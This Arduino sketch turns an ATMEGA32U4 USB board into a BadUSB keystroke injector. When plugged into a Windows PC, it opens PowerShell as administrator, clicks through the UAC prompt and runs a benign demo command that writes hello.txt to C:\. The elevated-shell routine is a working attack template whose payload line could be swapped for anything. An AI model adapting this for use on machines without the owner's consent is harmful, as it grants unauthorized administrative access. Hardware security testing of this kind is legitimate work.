// Example of using Lily GO USB Microcontroller ATMEGA32U4 as a BadUSB
//
// Purchase Link: https://www.aliexpress.com/item/4000613433474.html
//
// Board: Arduino Leonardo
//
// Mouse Reference: https://www.arduino.cc/reference/en/language/functions/usb/mouse/
// Keyboard Reference: https://www.arduino.cc/reference/en/language/functions/usb/keyboard/
// Keyboard Modifiers: https://www.arduino.cc/reference/en/language/functions/usb/keyboard/keyboardmodifiers/
//
// Differences between Keyboard.write(), Keyboard.print(), Keyboard.println() and Keyboard.press():
//  Keyboard.write()    Print a single character
//  Keyboard.print()    Print a string of characters
//  Keyboard.println()  Print a string of characters followed by a newline and carriage return
//  Keyboard.press()    Hold a key until Keyboard.release() or Keyboard.releaseAll() is called--useful for multi-key commands

#include <Keyboard.h>

// These values are for a fairly responsive PC
// They need to be increased if used against a slower machine
const int dlong = 500;
const int dshort = 50;

void setup() {
  Keyboard.begin();
  delay(dlong);
  
  // Open PowerShell as Administrator
  Keyboard.write(KEY_LEFT_GUI); // Windows key
  delay(dlong);
  Keyboard.print("powershell");
  delay(dlong);
  Keyboard.write(KEY_RIGHT_ARROW);
  delay(dshort);
  Keyboard.write(KEY_DOWN_ARROW);
  delay(dshort);
  Keyboard.write(KEY_RETURN);
  delay(dlong);

  // Bypass UAC
  Keyboard.write(KEY_LEFT_ARROW);
  delay(dshort);
  Keyboard.write(KEY_RETURN);
  delay(dlong);

  // Deliver payload
  Keyboard.println("Set-Content -Path \"C:\\hello.txt\" -Value \"hello, world!\" -Force"); 
  delay(dshort);

  // Close PowerShell
  Keyboard.println("exit");
}

void loop() {

}
